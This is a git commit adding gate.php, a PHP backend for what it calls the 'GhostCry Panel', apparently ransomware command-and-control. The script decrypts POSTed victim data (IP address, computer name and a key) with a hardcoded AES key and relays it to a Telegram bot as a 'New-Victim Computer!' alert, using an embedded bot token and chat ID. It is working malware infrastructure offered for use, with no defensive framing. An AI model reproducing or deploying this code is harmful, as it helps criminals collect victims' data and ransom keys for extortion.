9f67c7ae925863e1cacba52db74adbb1809c2ee6
garry1411 <118210456+garry1411@users.noreply.github.com>
2024-06-30 09:40:14 -0700

    Add files via upload

---
+++ gate.php
@@ -0,0 +1,40 @@
+<?php
+// Excepted key to decrypt data
+$expectedKey = 'f3a9ed6dbe870d165df1502dd4fb2d9f';
+$expectedIV = 'ff01f4ae6bb7917b';
+
+// Check post data
+if (!isset($_POST['data'])) {
+    echo "GhostCry Panel Access";
+    exit;
+}
+
+// Receive encrypted data from POST-request
+$encryptedData = $_POST['data'];
+
+// Try to decrypt
+$decryptedData = openssl_decrypt(base64_decode($encryptedData), 'AES-256-CBC', $expectedKey, OPENSSL_RAW_DATA, $expectedIV);
+$dataParts = explode('|', $decryptedData);
+list($API_IP, $PC, $key) = $dataParts;
+
+// Parameters for send to telegram-bot
+$botToken = '6751028071:AAEVWU3AVCsIm4ztgtXRSn9_fTeomjtuXFQ';
+$chatId = '6253341961';
+$message = "[🏴‍☠️] New-Victim Computer!\nIP: $API_IP\nPC: $PC\nKey: $key";
+
+$telegramUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";
+
+$data = array(
+    'chat_id' => $chatId,
+    'text' => $message
+);
+
+$ch = curl_init($telegramUrl);
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_exec($ch);
+curl_close($ch);
+
+exit;
+?>
